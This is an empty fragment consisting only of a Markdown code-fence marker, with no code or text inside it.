```

